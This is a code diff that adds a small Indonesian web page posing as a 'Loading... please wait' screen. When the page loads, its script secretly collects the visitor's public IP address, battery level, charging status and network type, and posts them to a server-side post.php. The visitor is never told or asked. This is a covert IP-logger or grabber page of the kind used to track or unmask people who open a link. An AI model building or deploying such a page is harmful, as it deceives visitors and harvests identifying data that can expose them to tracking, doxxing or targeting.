@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+</head>
+<body>
+  <h3>Silakan tunggu...</h3>
+
+  <script>
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Gagal ambil IP";
+      }
+    }
+
+    async function getBattery() {
+      if (!navigator.getBattery) return { level: "?", cas: "?" };
+      const b = await navigator.getBattery();
+      return {
+        level: Math.round(b.level * 100) + "%",
+        cas: b.charging ? "YA" : "TIDAK"
+      };
+    }
+
+    function getNetwork() {
+      const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      return nav ? nav.effectiveType.toUpperCase() : "TIDAK TERDETEKSI";
+    }
+
+    async function kirimData() {
+      const ip = await getIP();
+      const bat = await getBattery();
+      const net = getNetwork();
+
+      const data = {
+        ip: ip,
+        baterai: bat.level,
+        cas: bat.cas,
+        jaringan: net
+      };
+
+      await fetch("post.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    }
+
+    kirimData();
+  </script>
+</body>
+</html>
